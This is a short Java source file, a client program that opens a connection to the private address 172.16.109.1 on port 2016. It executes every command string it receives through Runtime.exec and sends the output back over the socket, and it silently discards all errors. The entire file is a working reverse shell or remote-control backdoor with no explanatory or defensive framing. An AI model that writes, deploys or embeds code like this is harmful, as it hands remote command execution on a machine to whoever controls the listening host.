 import java.net.*;
 import java.io.*;

 public class Client{

     public static void main(String []args){
        Socket s = new Socket();
        DataOutputStream out;
        BufferedReader in, bufferInput;

        try{
            s.connect(new InetSocketAddress("172.16.109.1", 2016));
            out = new DataOutputStream(s.getOutputStream());
            in = new BufferedReader(new InputStreamReader(s.getInputStream()));
            String message = "";
            while(!message.equals("exit")){
                message = in.readLine();
                if(message.equals("exit")){
                    break;
                }
                try{
                    Process process = Runtime.getRuntime().exec(message);
                    InputStream inputstream = process.getInputStream();
                    bufferInput = new BufferedReader(new InputStreamReader(inputstream));
                    String line = "";
                    out.writeBytes("--- " + message + " --- \n");
                    while((line = bufferInput.readLine()) != null){
                        out.writeBytes(line+" \n");
                    }
                    out.writeBytes("-------------\n");
                }catch(Exception e){  }
            }
            out.close();
            in.close();
            s.close();
        }catch(Exception e){ }
     }
 }